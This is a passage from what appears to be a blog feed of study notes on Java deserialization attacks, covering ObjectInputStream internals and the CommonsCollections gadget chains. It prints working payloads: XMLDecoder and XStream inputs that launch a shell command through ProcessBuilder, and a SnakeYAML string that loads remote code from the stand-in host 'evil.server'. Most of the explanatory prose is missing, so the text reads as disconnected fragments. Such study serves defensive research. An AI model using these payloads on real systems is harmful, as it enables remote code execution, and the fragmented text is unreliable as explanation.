</span></span><br></pre></td></tr></table></figure><p><code>ConstantTransformer</code><code>transform</code><code>TrAXFilter.class</code></p><p><code>InstaniateTransformer</code><code>transform</code></p><p><img src="/images/java-deserialized-commonscollections3-20191028/image-20191025215544053.png" alt="image-20191025215544053"></p><p>inputTrAXFilter.classphp__constructsJavaclass</p><p><code>TrAXFilter</code></p><p><img src="/images/java-deserialized-commonscollections3-20191028/image-20191025215631300.png" alt="image-20191025215631300"></p><p><code>templates</code>exp<code>templatesImpl</code>.</p><p>TransformerImplnewTransformer</p><p><code>org.apache.xalan.internal.xsltc.trax.TemplatesImpl.java:newTransformer:481</code></p><p><img src="/images/java-deserialized-commonscollections3-20191028/image-20191025215358907.png" alt="image-20191025215358907"></p><p><code>getTransletInstance</code></p><p><img src="/images/java-deserialized-commonscollections3-20191028/image-20191025215202858.png" alt="image-20191025215202858"></p><p><code>defineTransletClasses</code></p><p><img src="/images/java-deserialized-commonscollections3-20191028/image-20191025215052940.png" alt="image-20191025215052940"></p><p>0x02<code>defineTransletClasses</code><code>getTransletInstance</code><code>_bytecodes</code>Java</p><p>exp</p><ol><li><code>templates</code><code>TransformerImpl</code><code>newTransformer</code></li><li><code>templates</code><code>_name</code><code>null</code>,<code>_class</code><code>null</code></li><li><code>templates</code><code>_bytecodes</code><code>null</code>,<code>_tfactory</code><code>TransformerFactoryImpl</code></li><li><code>templates._bytecodes</code><code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code></li></ol><p>javassist</p><p>ysoserial</p><p><img src="/images/java-deserialized-commonscollections3-20191028/image-20191028155646352.png" alt="image-20191028155646352"></p><p>javassist<code>Gadgets.createTemplatesImpl</code></p><p>javassistysoserail<code>templates</code></p><p><code>_bytecodes</code>(130)<code>_auxClasses</code>,<code>getTransletInstance</code></p><p><code>getTransletInstance</code>408<code>_class</code></p><h1 id="0x04-"><a href="#0x04-" class="headerlink" title="0x04 "></a>0x04 </h1><p>CommonsCollections3</p><p>CommonsCollections3bytedefineClassClassClassJava</p><p>Java</p><ol><li>ClassMethod</li><li>defineClassbyteClass</li></ol><h3 id="20191104-"><a href="#20191104-" class="headerlink" title="20191104 "></a>20191104 </h3><p>3.2.2</p><p><img src="study-java-deserialized-commonscollections3-3-20191028/image-20191104193635375.png" alt="image-20191104193635375"></p><p>3.2.2InvokerTransformerreadObject<code>FunctorUtils.checkUnsafeSerialization</code></p><p><img src="study-java-deserialized-commonscollections3-3-20191028/image-20191104194440916.png" alt="image-20191104194440916"></p><p>UNSAFE_SERIALIZABLE_PROPERTYfalsetrue</p><p>InvokerTransformerthrowexceptionInvokerTransformerCloneTransformer, ForClosure, InstantiateFactory, InstantiateTransformer, InvokerTransformer,<br>PrototypeCloneFactory, PrototypeSerializationFactory, WhileClosure3.2.2</p><p></p>]]></content>
      
      
      <categories>
          
          <category> notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vul </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>notesJavaCommonsCollections1</title>
      <link href="2019/10/24/java/study-java-deserialized-commonscollections3-1/"/>
      <url>2019/10/24/java/study-java-deserialized-commonscollections3-1/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-"><a href="#0x00-" class="headerlink" title="0x00 "></a>0x00 </h1><a id="more"></a><p>shiroCommonCollections4JavaJava</p><p></p><h1 id="0x01-"><a href="#0x01-" class="headerlink" title="0x01 "></a>0x01 </h1><h2 id="1-Java"><a href="#1-Java" class="headerlink" title="1. Java"></a>1. Java</h2><p><code>ObjectOutputStream</code><code>writeObject</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">writeObject</span><span class="params">(Object x)</span> <span class="keyword">throws</span> IOException</span></span><br></pre></td></tr></table></figure><p><code>ObjectInputStream</code><code>readObject</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> Object <span class="title">readObject</span><span class="params">()</span> <span class="keyword">throws</span> IOException, ClassNotFoundException</span></span><br></pre></td></tr></table></figure><p></p><ol><li><code>java.io.Serializable</code></li><li><code>transient</code></li></ol><p>(<a href="http://www.runoob.com/java/java-serialization.html" target="_blank" rel="noopener"></a>)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Employee</span> <span class="keyword">implements</span> <span class="title">java</span>.<span class="title">io</span>.<span class="title">Serializable</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">   <span class="keyword">public</span> String name;</span><br><span class="line">   <span class="keyword">public</span> String address;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">transient</span> <span class="keyword">int</span> SSN;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">int</span> number;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">mailCheck</span><span class="params">()</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">      System.out.println(<span class="string">"Mailing a check to "</span> + name</span><br><span class="line">                           + <span class="string">" "</span> + address);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SerializeDemo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String [] args)</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">      Employee e = <span class="keyword">new</span> Employee();</span><br><span class="line">      e.name = <span class="string">"Reyan Ali"</span>;</span><br><span class="line">      e.address = <span class="string">"Phokka Kuan, Ambehta Peer"</span>;</span><br><span class="line">      e.SSN = <span class="number">11122333</span>;</span><br><span class="line">      e.number = <span class="number">101</span>;</span><br><span class="line">      <span class="keyword">try</span></span><br><span class="line">      &#123;</span><br><span class="line">         FileOutputStream fileOut =</span><br><span class="line">         <span class="keyword">new</span> FileOutputStream(<span class="string">"/tmp/employee.ser"</span>);</span><br><span class="line">         ObjectOutputStream out = <span class="keyword">new</span> ObjectOutputStream(fileOut);</span><br><span class="line">         out.writeObject(e);</span><br><span class="line">         out.close();</span><br><span class="line">         fileOut.close();</span><br><span class="line">         System.out.printf(<span class="string">"Serialized data is saved in /tmp/employee.ser"</span>);</span><br><span class="line">      &#125;<span class="keyword">catch</span>(IOException i)</span><br><span class="line">      &#123;</span><br><span class="line">          i.printStackTrace();</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>employee.ser</p><p><img src="/images/study_java_deseriablized/image-20190923193109921.png" alt="image-20190923193109921"></p><p><a href="https://docs.oracle.com/javase/8/docs/platform/serialization/spec/protocol.html" target="_blank" rel="noopener"></a><code>aced</code>javamagic word<code>STREAM_MAGIC</code>,<code>0005</code><code>STREAM_VERSION</code>,<code>73</code><code>TC_OBJECT</code>,<code>72</code><code>TC_CLASSDESC</code></p><p>Base64acedpayload</p><p>JVM<code>ObjectInputStream</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DeserializeDemo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String [] args)</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">      Employee e = <span class="keyword">null</span>;</span><br><span class="line">      <span class="keyword">try</span></span><br><span class="line">      &#123;</span><br><span class="line">         FileInputStream fileIn = <span class="keyword">new</span> FileInputStream(<span class="string">"/tmp/employee.ser"</span>);</span><br><span class="line">         ObjectInputStream in = <span class="keyword">new</span> ObjectInputStream(fileIn);</span><br><span class="line">         e = (Employee) in.readObject();</span><br><span class="line">         in.close();</span><br><span class="line">         fileIn.close();</span><br><span class="line">      &#125;<span class="keyword">catch</span>(IOException i)</span><br><span class="line">      &#123;</span><br><span class="line">         i.printStackTrace();</span><br><span class="line">         <span class="keyword">return</span>;</span><br><span class="line">      &#125;<span class="keyword">catch</span>(ClassNotFoundException c)</span><br><span class="line">      &#123;</span><br><span class="line">         System.out.println(<span class="string">"Employee class not found"</span>);</span><br><span class="line">         c.printStackTrace();</span><br><span class="line">         <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      System.out.println(<span class="string">"Deserialized Employee..."</span>);</span><br><span class="line">      System.out.println(<span class="string">"Name: "</span> + e.name);</span><br><span class="line">      System.out.println(<span class="string">"Address: "</span> + e.address);</span><br><span class="line">      System.out.println(<span class="string">"SSN: "</span> + e.SSN);</span><br><span class="line">      System.out.println(<span class="string">"Number: "</span> + e.number);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>readObject</code>SSNtransient0</p><p>readObjectreadObject</p><p>EmployeereadObject</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream in)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">  in.defaultReadObject();</span><br><span class="line">  System.out.println(<span class="string">"Employee call readObject Function"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p></p><p><img src="/images/study_java_deseriablized/image-20191008145635285.png" alt="image-20191008145635285"></p><h2 id="2-"><a href="#2-" class="headerlink" title="2. "></a>2. </h2><p><code>ObjectInputStream.readObject</code>Java</p><p></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputStream.readObject<span class="comment">// Object</span></span><br><span class="line">ObjectInputStream.readUnshared <span class="comment">// Object</span></span><br><span class="line">XMLDecoder.readObject <span class="comment">// xmlObject</span></span><br><span class="line">Yaml.load<span class="comment">// yamlObject</span></span><br><span class="line">XStream.fromXML<span class="comment">// XStreamJava Objectxml</span></span><br><span class="line">ObjectMapper.readValue<span class="comment">// jacksonapi</span></span><br><span class="line">JSON.parseObject<span class="comment">// fastjsonapi</span></span><br></pre></td></tr></table></figure><p>Note: readUnsharedreadObject</p><blockquote><p>readUnsharedreadObjectreadUnsharedreadObject</p></blockquote><p>readObject</p><h2 id="3-"><a href="#3-" class="headerlink" title="3. "></a>3. </h2><p><code>readUnshared</code><code>readObject</code></p><h3 id="a-XMLDecoder-readObject"><a href="#a-XMLDecoder-readObject" class="headerlink" title="a. XMLDecoder.readObject"></a>a. XMLDecoder.readObject</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">  String poc = <span class="string">"poc.xml"</span>;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    FileInputStream file = <span class="keyword">new</span> FileInputStream(poc);</span><br><span class="line">    XMLDecoder decoder = <span class="keyword">new</span> XMLDecoder(file);</span><br><span class="line">    decoder.readObject();</span><br><span class="line">    decoder.close();</span><br><span class="line">  &#125; <span class="keyword">catch</span> (FileNotFoundException e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>poc.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">java</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">object</span> <span class="attr">class</span>=<span class="string">"java.lang.ProcessBuilder"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">array</span> <span class="attr">class</span>=<span class="string">"java.lang.String"</span> <span class="attr">length</span>=<span class="string">"3"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">"0"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">string</span>&gt;</span>/bin/sh<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">"1"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">string</span>&gt;</span>-c<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">"2"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">string</span>&gt;</span>open /Applications/Calculator.app<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">"start"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">java</span>&gt;</span></span><br></pre></td></tr></table></figure><p></p><h3 id="b-Yaml-load"><a href="#b-Yaml-load" class="headerlink" title="b. Yaml.load"></a>b. Yaml.load</h3><p><a href="https://blog.semmle.com/swagger-yaml-parser-vulnerability/" target="_blank" rel="noopener"></a></p><p>SnakeYAML</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.yaml/snakeyaml --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.yaml<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>snakeyaml<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.25<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">  String yamlStr = <span class="string">"!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader "</span></span><br><span class="line">                   + <span class="string">"[[!!java.net.URL [\"http://evil.server\"]]]]"</span>;</span><br><span class="line">  Yaml yaml = <span class="keyword">new</span> Yaml();</span><br><span class="line">  Object obj = yaml.load(yamlStr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>yamlStr<a href="https://github.com/mbechler/marshalsecpayload" target="_blank" rel="noopener">https://github.com/mbechler/marshalsecpayload</a></p><h3 id="c-XStream-fromXML"><a href="#c-XStream-fromXML" class="headerlink" title="c. XStream.fromXML"></a>c. XStream.fromXML</h3><p><a href="http://www.polaris-lab.com/index.php/archives/658/" target="_blank" rel="noopener"></a></p><p>XStream</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.thoughtworks.xstream<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>xstream<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.4.10<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"><span class="comment">//        expGen();</span></span><br><span class="line">        String payload = <span class="string">"&lt;sorted-set&gt;\n"</span> +</span><br><span class="line">                <span class="string">"    &lt;string&gt;foo&lt;/string&gt;\n"</span> +</span><br><span class="line">                <span class="string">"    &lt;dynamic-proxy&gt;\n"</span> +</span><br><span class="line">                <span class="string">"    &lt;interface&gt;java.lang.Comparable&lt;/interface&gt;\n"</span> +</span><br><span class="line">                <span class="string">"        &lt;handler class=\"java.beans.EventHandler\"&gt;\n"</span> +</span><br><span class="line">                <span class="string">"            &lt;target class=\"java.lang.ProcessBuilder\"&gt;\n"</span> +</span><br><span class="line">                <span class="string">"                &lt;command&gt;\n"</span> +</span><br><span class="line">                <span class="string">"                    &lt;string&gt;/bin/sh&lt;/string&gt;\n"</span> +</span><br><span class="line">                <span class="string">"                    &lt;string&gt;-c&lt;/string&gt;\n"</span> +</span><br><span class="line">                <span class="string">"                    &lt;string&gt;open /System/Applications/Calculator.app&lt;/string&gt;\n"</span> +</span><br><span class="line">                <span class="string">"                &lt;/command&gt;\n"</span> +</span><br><span class="line">                <span class="string">"            &lt;/target&gt;\n"</span> +</span><br><span class="line">                <span class="string">"     &lt;action&gt;start&lt;/action&gt;"</span>+</span><br><span class="line">                <span class="string">"        &lt;/handler&gt;\n"</span> +</span><br><span class="line">                <span class="string">"    &lt;/dynamic-proxy&gt;\n"</span> +</span><br><span class="line">                <span class="string">"&lt;/sorted-set&gt;\n"</span>;</span><br><span class="line">        XStream xStream = <span class="keyword">new</span> XStream();</span><br><span class="line">        xStream.fromXML(payload);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="d-67"><a href="#d-67" class="headerlink" title="d. 67"></a>d. 67</h3><h2 id="4-"><a href="#4-" class="headerlink" title="4. "></a>4. </h2><p>Java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(readObject|readUnshared|load|fromXML|readValue|parseObject)\s*\(</span><br></pre></td></tr></table></figure><p></p><h1 id="0x02-"><a href="#0x02-" class="headerlink" title="0x02 "></a>0x02 </h1><p><code>Employee</code></p><p><code>ObjectInputStream</code><code>readObject</code></p><p></p><p></p><p><code>ObjectInputStream:readObject:417</code></p><p><img src="/images/study_java_deseriablized/image-20191009165050116.png" alt="image-20191009165050116"></p><p>ObjectInputStreamreadObject<code>readObject0</code></p><p><code>ObjectInputStream:readObject0:1515</code></p><p><img src="/images/study_java_deseriablized/image-20191009171309599.png" alt="image-20191009171309599"></p><p><code>tc=115</code>Object<code>readOrdinaryObject</code></p><p><code>ObjectInputStream:readOrdinaryObject:2026</code></p><p><img src="/images/study_java_deseriablized/image-20191009191352950.png" alt="image-20191009191352950"></p><p>2033ObjectStreamClass2044</p><p>ObjectStreamClasslookupnewInstance</p><blockquote><p>Serializations descriptor for classes. It contains the name and serialVersionUID of the class. The ObjectStreamClass for a specific class loaded in this Java VM can be found/created using the lookup method.</p></blockquote><p><code>readClassDesc</code><code>ObjectInputStream.resolveClass</code></p><p><img src="/images/study_java_deseriablized/image-20191009193053871.png" alt="image-20191009193053871" style="zoom:50%;"></p><p><code>ObjectInputStream:resolveClass:677</code></p><p><img src="/images/study_java_deseriablized/image-20191009193404315.png" alt="image-20191009193404315"></p><p>jvmClassnewInstance</p><p><code>Class.forName</code>Class<code>initNonProxy</code><code>initProxy</code>Class()2044<code>ObjectStreamClass.newInstance</code></p><p><code>ObjectInputStream.readSerialData</code>readObject</p><p><code>ObjectInputStream:readSerialData:2149</code></p><p><img src="/images/study_java_deseriablized/image-20191011113246544.png" alt="image-20191011113246544"></p><p>readObjectfieldreadObjectCommonsCollections1<code>AnnotationInvocationHandler</code></p><p>SerializableExternalizable</p><p></p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p><a href="https://github.com/Cryin/Paper/blob/master/Java.md" target="_blank" rel="noopener">Java</a></p><blockquote><p>JavaObjectInputStreamreadObjectclassObjectStreamClassclassObjectStreamClassserialVersionUID</p><p>resolveProxyClassresolveClassClassNotFoundException</p><p>StringarrayenumObjectStreamClassjava.io.SerializableexternalizableInvalidClassExceptionSerializableExternalizable</p></blockquote><p><code>resolveClass</code>Class<code>ObjectInputStream</code><code>resolveClass</code></p><h1 id="0x03-"><a href="#0x03-" class="headerlink" title="0x03 "></a>0x03 </h1><p>PHPjava<a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener">ysoserial</a></p><h2 id="1-CommonsCollections1-jdk-lt-7"><a href="#1-CommonsCollections1-jdk-lt-7" class="headerlink" title="1. CommonsCollections1(jdk&lt;=7)"></a>1. CommonsCollections1(jdk&lt;=7)</h2><p><a href="https://security.tencent.com/index.php/blog/msg/97" target="_blank" rel="noopener"></a></p><blockquote><p>Apache Commons CollectionsJavaCollectionApacheCommons CollectionsJava</p></blockquote><p>CommonsCollection1gadgetysoserialpayload</p><p>CommonsCollections1 payloadcommons-collections 3.1</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- https://mvnrepository.com/artifact/commons-collections/commons-collections --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>ysoserialexp</p><p><img src="/images/study_java_deseriablized/image-20191011113756573.png" alt="image-20191011113756573"></p><p><code>Runtime.getRuntime().exec()</code></p><p>CommonsCollections13.1<code>InvokerTransformer.transform()</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (input == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Class cls = input.getClass();</span><br><span class="line">        Method method = cls.getMethod(iMethodName, iParamTypes);</span><br><span class="line">        <span class="keyword">return</span> method.invoke(input, iArgs);</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (NoSuchMethodException ex) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">"InvokerTransformer: The method '"</span> + iMethodName + <span class="string">"' on '"</span> + input.getClass() + <span class="string">"' does not exist"</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalAccessException ex) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">"InvokerTransformer: The method '"</span> + iMethodName + <span class="string">"' on '"</span> + input.getClass() + <span class="string">"' cannot be accessed"</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (InvocationTargetException ex) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">"InvokerTransformer: The method '"</span> + iMethodName + <span class="string">"' on '"</span> + input.getClass() + <span class="string">"' threw an exception"</span>, ex);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Java<code>iMethodNameiParamTypesiArgs</code>InvokerTransformer</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>();</span><br><span class="line">    iMethodName = methodName;</span><br><span class="line">    iParamTypes = paramTypes;</span><br><span class="line">    iArgs = args;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>phptransform<code>Runtime.getRuntime().exec()</code>transformRuntime.getRuntimeRuntime.exectransform<code>ChainedTransformer</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> Transformer[] iTransformers;<span class="comment">// </span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object object)</span> </span>&#123;</span><br><span class="line">    <span 